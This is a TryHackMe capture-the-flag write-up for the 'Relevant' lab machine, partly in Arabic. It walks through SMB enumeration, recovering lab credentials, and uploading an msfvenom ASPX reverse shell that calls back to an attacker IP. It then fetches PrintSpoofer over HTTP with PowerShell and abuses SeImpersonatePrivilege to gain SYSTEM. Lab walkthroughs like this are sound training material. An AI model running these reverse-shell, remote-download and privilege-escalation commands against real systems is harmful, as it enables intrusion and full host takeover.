# TryHackMe — Relevant Write-up

> **Target:** `10.113.177.163`  
> **Hostname:** `RELEVANT`  
> **OS:** Windows Server 2016 Standard Evaluation 14393

## 1. Enumeration

بدأت بفحص جميع الـTCP ports مع service/version detection وdefault scripts:

```bash
nmap -T5 -p- -sVC 10.113.177.163
```

### Open Ports

| Port | Service | Notes |
|---:|---|---|
| 80 | HTTP | Microsoft IIS 10.0 |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | SMB over NetBIOS |
| 445 | SMB | Windows Server 2016 |
| 3389 | RDP | Microsoft Terminal Services |
| 49663 | HTTP | IIS web service used by the `nt4wrksv` share |

Interesting findings from the scan included:

- Hostname: `RELEVANT`
- Workgroup: `WORKGROUP`
- Windows Server 2016 build `14393`
- SMB signing was not required.
- SMB guest access was available for enumeration.

---

## 2. SMB Enumeration

Enumerated available SMB shares without credentials:

```bash
smbclient -L \\10.113.177.163 -N
```

Discovered shares:

```text
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

The SMB1 workgroup listing error at the end did not prevent us from enumerating the shares.

---

## 3. Enumerating the `nt4wrksv` Share

Connected to the writable share anonymously:

```bash
smbclient //10.113.177.163/nt4wrksv -N
```

Inside the share, I found `passwords.txt` containing Base64-encoded credentials:

```text
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decoded values:

```text
Bob  - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

> These credentials are specific to this CTF/lab target.

---

## 4. SMB Permission Enumeration

Used `smbmap` to verify the permissions of the discovered users:

```bash
smbmap -H 10.113.177.163 -u Bob -p '<BOB_PASSWORD>'
smbmap -H 10.113.177.163 -u Bill -p '<BILL_PASSWORD>'
```

Both users had access to the `nt4wrksv` share, including **READ/WRITE** permissions.

This writable share became the main path for the initial shell.

---

## 5. Discovering the IIS Mapping on Port 49663

The important detail was that the `nt4wrksv` share was also accessible through IIS on port `49663`.

Tested the web path with:

```bash
curl -i http://10.113.177.163:49663/nt4wrksv/passwords.txt
```

This confirmed that the SMB share was mapped to the IIS web service.

---

## 6. Getting an Initial Reverse Shell

Generated an ASPX reverse-shell payload with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.193.30 LPORT=4444 -f aspx -o shell.aspx
```

> Replace `192.168.193.30` with your actual Kali/VPN IP.

Uploaded the generated `shell.aspx` to the writable SMB share:

```bash
smbclient //10.113.177.163/nt4wrksv -U Bill
```

Then inside `smbclient`:

```text
put shell.aspx
ls
exit
```

Started a listener on Kali:

```bash
nc -lvnp 4444
```

Triggered the ASPX payload through IIS:

```bash
curl -i http://10.113.177.163:49663/nt4wrksv/shell.aspx
```

This returned a reverse shell on Kali.

The initial shell was running as a low-privileged Windows user. The user flag was located under:

```text
C:\Users\Bob\Desktop
```

---

## 7. Privilege Escalation Enumeration

After getting the shell, checked the current user and Windows privileges:

```cmd
whoami
whoami /priv
```

The important finding was:

```text
SeImpersonatePrivilege    Enabled
```

This privilege is commonly exploitable on Windows when the current process can impersonate a privileged client.

---

## 8. Privilege Escalation with PrintSpoofer

Used **PrintSpoofer64.exe** to abuse the enabled `SeImpersonatePrivilege` privilege.

First, downloaded the executable to the Kali machine.

Started a temporary HTTP server from the directory containing the executable:

```bash
python3 -m http.server 8080
```

Then, from the Windows shell, downloaded the executable:

```cmd
powershell -c "iwr http://YOUR-KALI-IP:8080/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe"
```

> During this lab, the executable was placed in `C:\Windows\Temp`; the original notes observed different antivirus behavior depending on the directory.

Executed PrintSpoofer:

```cmd
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd.exe
```

Then verified the privilege level:

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

At this point, the shell had **SYSTEM** privileges.

---

## 9. Root Flag

After obtaining `NT AUTHORITY\SYSTEM`, the administrator/root flag could be read from the Administrator desktop:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

# Attack Path Summary

```text
Nmap
  |
  +--> SMB (445)
        |
        +--> nt4wrksv share
              |
              +--> passwords.txt
              |      |
              |      +--> Bob credentials
              |      +--> Bill credentials
              |
              +--> READ/WRITE
                    |
                    +--> upload shell.aspx
                          |
                          +--> IIS on 49663
                                |
                                +--> Reverse shell
                                      |
                                      +--> SeImpersonatePrivilege
                                            |
                                            +--> PrintSpoofer64
                                                  |
                                                  +--> NT AUTHORITY\\SYSTEM
                                                        |
                                                        +--> root.txt
```

## Key Commands Used

### Enumeration

```bash
nmap -T5 -p- -sVC 10.113.177.163
smbclient -L \\10.113.177.163 -N
smbclient //10.113.177.163/nt4wrksv -N
smbmap -H 10.113.177.163 -u Bob -p '<BOB_PASSWORD>'
smbmap -H 10.113.177.163 -u Bill -p '<BILL_PASSWORD>'
```

### Web / IIS

```bash
curl -i http://10.113.177.163:49663/nt4wrksv/passwords.txt
```

### Payload / Initial Shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.193.30 LPORT=4444 -f aspx -o shell.aspx
nc -lvnp 4444
curl -i http://10.113.177.163:49663/nt4wrksv/shell.aspx
```

### Privilege Escalation

```cmd
whoami
whoami /priv
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd.exe
whoami
type C:\Users\Administrator\Desktop\root.txt
```
